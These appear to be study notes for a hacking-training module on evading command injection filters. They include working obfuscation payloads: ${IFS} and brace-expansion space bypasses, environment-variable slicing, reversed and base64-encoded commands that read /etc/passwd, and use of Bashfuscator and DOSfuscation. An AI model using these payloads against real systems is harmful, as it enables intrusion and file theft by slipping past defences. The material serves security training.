# Identifying Filters

Let's see we sent the following payload and received an "Invalid Input" message:

```sh
127.0.0.1; whoami
```

Other than the IP, we sent the following 
1. A semi-colon character
2. A space character
3. A `whoami` command

So, the web application either detected a **blacklisted character** or detected a **blacklisted command**

## Blacklisted Characters

A web app may have a list of blacklisted characters, if our command/payload contains them, it would deny the request.

Before we start our attempt at bypassing the filters, we should try to identify which character caused the denied request.

## Identifying Blacklisted Character

We should reduce our request to one character at a time and see when it gets blocked.

# Bypassing Space Filters

## Bypass Blacklisted Operators

We can check for different operators. In the example in HTB Academy, the `\n` new line operator was used for the bypass.

## Bypass Blacklisted Spaces

#### Using Tabs

Using tabs (`%09`) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments.
#### Using $IFS

```sh
${IFS}
```

#### Using Brace Expansion

We can use the **Bash Brace Expansion** feature, which automatically adds spaces between arguments wrapped between braces.

```sh
{ls,-la}
```

# Bypassing Other Blacklisted Characters

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`).
## Linux

In the same way we bypassed using spaces via environment variable `${IFS}`, we can use environment variables to replace slashes or any character.

While `${IFS}` directly replaced a space, there's no such environment variable for slashes or semi-columns. However, these characters may be used in an environment variable, and we can specify **start** and **length** of our string to exactly match this character.

```sh
echo ${PATH} 

/usr/local/bin:/usr/bin:/bin:/usr/games
```

```sh
echo ${PATH:0:1}

/
```

```ad-tip
We can use `printenv` command to print all environment variables in Linux.
```

## Windows

The same concept works on Windows as well. We can echo a Windows variable and then specify a starting position, and finally specify a negative end position.

```powershell
echo %HOMEPATH:~6,-11% 

\
```

We can achieve the same thing using the same variables in `Windows PowerShell`.

```powershell
$env:HOMEPATH[0] 

\
```

```ad-tip
We can use `Get-ChildItem Env:` command to print all environment variables.
```

## Character Shifting

```sh
man ascii # \ is on 92, before it is [ on 91

echo $(tr '!-}' '"-~'<<<[)
\
```

# Bypassing Blacklisted Commands

## Linux & Windows

One very common and easy obfuscation technique is inserting certain characters withing the command that are usually ignored by shells like Bash and PowerShell. E.g. single-quote `'` and double-quote `"`, in addition to few others.

**Example:**

```sh
w'h'o'am'i
```

## Linux Only

We can insert few characters in the middle of commands and bash would ignore them and execute the command. These characters include:

- Backslash `\`
- Positional Parameter Character `$@`

The number of characters do not have to be even.

```sh
who$@ami
w\ho\am\i
```

```ad-warning
If the above examples didn't work, this may indicate that we used a filtered character in our payload.
```

## Windows Only

There are also some Windows-only characters that we can insert in the middle of commands, like caret (`^`) character.

```powershell
who^ami
```

# Advanced Command Obfuscation

## Case Manipulation
**Case Manipulation** is like inverting the character cases of a command (e.g. `WHOAMI`) or alternating between cases (e.g. `WhOaMi`). This usually works because a command blacklist may not check for different case variations of a single word, as <span style="color:rgb(192, 0, 0)">Linux systems are case-sensitive</span>. 

```PowerShell
WhOaMi
```

For Linux, we have to get creative and find a command that turns the command into an all-lowercase word. One working example is:

```sh
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

We can use many other commands for the same purpose like the following:

```sh
$(a="WhOaMi";printf %s "${a,,}")
```

## Reversed Commands

```sh
echo 'whoami' | rev

imaohw
```

Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:

```sh
$(rev<<<'imaohw')

# we will get the username in the output
```

The same can be applied in `Windows.` We can first reverse a string, as follows:

```powershell
"whoami"[-1..-20] -join '' 

imaohw
```

We can use the below command to execute a reversed string with PowerShell sub-shell (`iex "$()"`), as follows:

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```

## Encoded Commands

We can use different types of encoding tools like `base64` or `xxd` (for hex encoding).

```sh
echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Now we can create a command that will decode the encoded string in a sub-shell and then pass it to bash to be executed, as follows:

```sh
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

![[cmdinj_filters_commands_6.jpg]]

We can use the same technique on Windows as well

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

```sh
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

```PowerShell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```


---

# Evasion Tools

## Linux (Bashfuscator)

```sh title="Bashfuscator Installation"
git clone https://github.com/Bashfuscator/Bashfuscator

pip3 install setuptools==65

python3 setup.py install --user
```

```bash title="Bashfuscator Usage"
cd ./bashfuscator/bin/

./bashfuscator -h

./bashfuscator -c 'cat /etc/passwd'
```

```bash title="Last Command Output"
${*/+27\[X\(} ...SNIP... ${*~}
```

We can use some flags with the tool to get simpler and shorter obfuscated commands:

```sh title="Bashfuscator Usage with Flags"
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

```sh title="Last Command Output"
eval "$(W0=(w \ t e c p s a / d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

## Windows (DOSfuscation)

```PowerShell title="DOSfuscation Setup & Usage"
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git

cd Invoke-DOSfuscation

Import-Module .\Invoke-DOSfuscation.psd1

Invoke-DOSfuscation

Invoke-DOSfuscation> help

Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt

Invoke-DOSfuscation> encoding

Invoke-DOSfuscation\Encoding> 1
```

